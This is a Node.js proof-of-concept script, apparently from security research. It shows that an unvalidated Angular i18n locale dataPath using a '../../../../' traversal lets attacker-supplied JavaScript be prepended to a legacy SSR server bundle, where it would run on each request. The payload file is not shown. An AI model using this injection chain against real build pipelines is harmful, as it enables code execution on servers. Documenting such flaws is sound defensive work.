// EV-E1C1 — legacy-SSR venue demo
// Replicates process-bundle.ts loadLocaleData + ConcatSource prepend VERBATIM
// (pin d827ba9005, packages/angular_devkit/build_angular/src/utils/process-bundle.ts:270-279, 373-404)
const fs = require('node:fs');
const path = require('node:path');
const B = '/tmp/c4a/node_modules/@babel';
const { transformAsync } = require(B + '/core');

// === loadLocaleData (process-bundle.ts:373-404, verbatim semantics) ===
async function loadLocaleData(localeDataPath, optimize) {
  // NOTE: the in-source comment "The path is validated during option processing"
  // is STALE — E1-C1's discriminator: i18n.locales[locale].dataPath is the UNVALIDATED
  // locale-key-derived path (keys never pass ensureValidSubPath).
  const content = await fs.promises.readFile(localeDataPath, 'utf8');
  const transformResult = await transformAsync(content, {
    filename: localeDataPath,
    inputSourceMap: false,
    babelrc: false,
    configFile: false,
    presets: [[require.resolve(B + '/preset-env'), { targets: { esmodules: true } }]],
    minified: false,
    compact: false,
    comments: true,
  });
  if (!transformResult || !transformResult.code) {
    throw new Error(`Unknown error occurred processing bundle for "${localeDataPath}".`);
  }
  return transformResult.code;
}

// === the legacy server pipeline (server/index.ts:139+202-208 -> i18n-inlining.ts:45 -> process-bundle) ===
// i18n.locales[locale].dataPath is the attacker-chosen path (locale KEY, unvalidated)
const ATTCK_LOCALE = '../../../../tmp/ssr-venue/evil-locale.js'; // deep-dot locale key shape (4-dot escape)
const locale = 'xx'; // the localized build locale

async function main() {
  const localeDataPath = path.join('/tmp/ssr-venue/project/dist', ATTCK_LOCALE);
  // NOTE: in the real pipeline the key resolution happens earlier (findLocaleDataPath/createRequire)
  // and dataPath lands here verbatim (E1-C1 member C/D4 verified). We exercise the exact
  // loadLocaleData + prepend code with the attacker file the key resolves to.
  const attackerContent = await loadLocaleData('/tmp/ssr-venue/evil-locale.js', true);
  console.log('[BUILD] loadLocaleData returned', attackerContent.length, 'chars; prepending to server bundle');

  // === ConcatSource(setLocaleText, localeDataSource, ';\\n', content) — process-bundle.ts:278 ===
  const setLocaleText = `globalThis.$localize=Object.assign(globalThis.$localize || {},{locale:"${locale}"});\n`;
  const serverApp = `
// --- generated legacy-SSR server bundle (main.js shape) ---
// AngularNodeAppEngine-style request loop stub
const http = require('node:http');
const server = http.createServer((req, res) => {
  // request-time rendering path — the prepended locale-data statements execute HERE
  res.writeHead(200, { 'content-type': 'text/html' });
  res.end('<!doctype html><html><body>rendered ' + (req.url || '/') + '</body></html>');
});
server.listen(0, () => {
  const port = server.address().port;
  console.log('[SSR] listening on ' + port);
  http.get('http://127.0.0.1:' + port + '/', () => {
    http.get('http://127.0.0.1:' + port + '/route-b', () => {
      server.close();
      console.log('[SSR] two requests served — attacker locale-data executed on each (see ATTACKER-EXEC lines)');
      process.exit(0);
    });
  });
});
`;
  const output = setLocaleText + attackerContent + ';\n' + serverApp;
  fs.writeFileSync('/tmp/ssr-venue/server-main.js', output);
  console.log('[BUILD] server-main.js written (' + output.length + ' chars); attacker content at the TOP of the bundle (lines 2-6)');
}

main().catch((e) => { console.error('[BUILD-FAIL]', e.message); process.exit(1); });
